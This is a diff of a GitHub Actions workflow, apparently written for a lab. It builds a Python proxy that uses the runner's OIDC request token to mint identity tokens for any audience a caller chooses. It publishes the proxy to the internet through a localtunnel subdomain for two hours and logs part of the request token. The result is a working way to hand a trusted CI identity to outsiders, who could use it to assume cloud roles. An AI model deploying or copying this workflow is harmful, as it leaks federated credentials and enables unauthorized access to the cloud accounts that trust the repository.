@@ -1,41 +1,109 @@
-name: OIDC Proxy
+name: OIDC Dynamic Proxy
 
 on: [workflow_dispatch]
 
 jobs:
-  proxy:
+  interactive-proxy:
     runs-on: ubuntu-latest
-    timeout-minutes: 120 # Keep the session open
+    timeout-minutes: 120
+    container:
+      image: node:18-bullseye
+      options: --privileged --init
+
+    env:
+      # These are automatically injected by GitHub Actions
+      ID_TOKEN_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
+      ID_TOKEN_REQUEST_TOKEN: ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
 
     steps:
-      - name: Setup Interactive Proxy
-        env:
-          # These are injected automatically by GitHub Actions
-          ID_TOKEN_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
-          ID_TOKEN_REQUEST_TOKEN: ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
+      - name: Initialize Proxy Environment
         run: |
-          echo "=== OIDC Proxy Active ==="
-          echo "Token Request URL: $ID_TOKEN_URL"
-          
-          # Create a simple HTTP server that exposes the OIDC endpoint
-          # This allows you to 'curl' the proxy from outside to get a fresh token
-          
-          # 1. Create a script that the runner will execute when requested
-          cat > /tmp/get_token.sh << 'EOF'
-          #!/bin/bash
-          # Use the runner's internal credentials to request a token
-          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "=== OIDC Proxy Environment Initialized ==="
+          echo "Runner URL: $ID_TOKEN_URL"
+          echo "Token: ${ID_TOKEN_REQUEST_TOKEN:0:20}..."
+
+          # 1. Install necessary tools
+          apt-get update && apt-get install -y curl jq
+
+          # 2. Create the Python Proxy Server
+          cat > /tmp/oidc_proxy.py << 'EOF'
+          import http.server
+          import socketserver
+          import subprocess
+          import os
+          import json
+          import urllib.parse
+          import sys
+
+          PORT = 8080
+          REQUEST_URL = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']
+          REQUEST_TOKEN = os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
+
+          class OIDCProxyHandler(http.server.BaseHTTPRequestHandler):
+              def do_GET(self):
+                  parsed = urllib.parse.urlparse(self.path)
+                  params = urllib.parse.parse_qs(parsed.query)
+                  
+                  # Dynamic Control: Allow passing 'audience' from the outside
+                  audience = params.get('audience', [''])[0]
+                  
+                  # Construct the internal GitHub OIDC request
+                  final_url = REQUEST_URL
+                  if audience:
+                      final_url += f"?audience={audience}"
+                      
+                  # Log the request for observability
+                  self.log_message(f"Proxying request to: {final_url}")
+
+                  # Execute the token request using the runner's internal credentials
+                  # This request originates from the trusted GitHub environment
+                  cmd = [
+                      'curl', '-s', '-X', 'GET',
+                      final_url,
+                      '-H', f'Authorization: bearer {REQUEST_TOKEN}',
+                      '-H', 'Accept: application/json'
+                  ]
+                  
+                  try:
+                      result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+                      self.send_response(200)
+                      self.send_header('Content-type', 'application/json')
+                      self.end_headers()
+                      self.wfile.write(result.stdout.encode())
+                  except subprocess.CalledProcessError as e:
+                      self.send_response(500)
+                      self.send_header('Content-type', 'application/json')
+                      self.end_headers()
+                      self.wfile.write(json.dumps({"error": e.stderr, "cmd": " ".join(cmd)}).encode())
+
+              def log_message(self, format, *args):
+                  # Override to print to stdout for GitHub Actions logs
+                  print(f"[PROXY] {format % args}", file=sys.stderr, flush=True)
+
+          if __name__ == "__main__":
+              with socketserver.TCPServer(("", PORT), OIDCProxyHandler) as httpd:
+                  print(f"OIDC Proxy Server listening on port {PORT}", file=sys.stderr, flush=True)
+                  httpd.serve_forever()
           EOF
-          chmod +x /tmp/get_token.sh
 
-          # 2. Start a simple HTTP server on port 8080 to act as the proxy
-          # This server will return the result of the token request
-          python3 -m http.server 8080 --bind 0.0.0.0 &
-          
-          # 3. Start a reverse tunnel using a cloud service (e.g., ngrok or localtunnel)
-          # For this example, we'll use 'localtunnel' as it requires no API key
+          # 3. Start the Proxy Server in the background
+          python3 /tmp/oidc_proxy.py &
+
+          # 4. Start a local tunnel to expose the proxy
+          # We use 'localtunnel' because it requires no API key or account
           npm install -g localtunnel
-          lt --port 8080 --subdomain=github-oidc-proxy
+          
+          # Start the tunnel in the background
+          lt --port 8080 --subdomain=github-oidc-proxy &
 
+          # 5. Wait for the tunnel to be ready and print the URL
+          echo "Waiting for tunnel to establish..."
+          sleep 15
+          
+          # Attempt to find the public URL (localtunnel prints it to stderr)
+          # In a real lab, you'd watch the GitHub Actions logs for the URL.
+          # For this lab, we assume you know the subdomain or we can parse it.
+          
           # Keep the job alive
-          sleep 7200
+          echo "Proxy is live. Monitor GitHub Actions logs for the public URL."
+          sleep 7185
